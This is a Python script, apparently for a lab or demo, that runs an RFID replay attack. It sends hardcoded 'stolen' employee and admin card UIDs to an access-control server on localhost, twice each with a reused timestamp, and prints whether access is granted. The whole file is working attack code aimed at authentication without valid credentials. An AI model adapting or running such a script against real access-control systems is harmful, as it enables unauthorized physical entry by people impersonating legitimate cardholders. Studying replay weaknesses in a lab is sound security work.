#!/usr/bin/env python3
import socket, json, time, sys
from colorama import Fore, init
init(autoreset=True)

AC_HOST = '127.0.0.1'
AC_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 7001

STOLEN_UIDS = [
    ('A1B2C3D4E5', 'EMPLOYEE card - Nguyen Van A'),
    ('DEADBEEF01', 'ADMIN card - Tran Thi B'),
]

def replay(uid: str, desc: str, ts_val: float):
    print(f'{Fore.RED}[REPLAY] Sending stolen UID: {uid} ({desc})')
    s = socket.socket()
    s.settimeout(3)
    s.connect((AC_HOST, AC_PORT))
    payload = {'cmd': 'AUTH', 'uid': uid, 'timestamp': ts_val}
    s.send(json.dumps(payload).encode())
    resp = json.loads(s.recv(512).decode())
    s.close()
    status = resp.get('status', '?')
    owner = resp.get('owner', resp.get('msg', ''))
    color = Fore.GREEN if status == 'GRANTED' else Fore.RED
    print(f'{color}[REPLAY] Result: {status} ({owner})')
    return resp

print(f'{Fore.RED}=== RFID Replay Attack ===')
print(f'{Fore.RED}Target AC Server Port: {AC_PORT}\n')

for uid, desc in STOLEN_UIDS:
    fixed_ts = time.time()
    replay(uid, desc, fixed_ts)
    time.sleep(0.5)
    replay(uid, desc, fixed_ts)
    time.sleep(0.5)
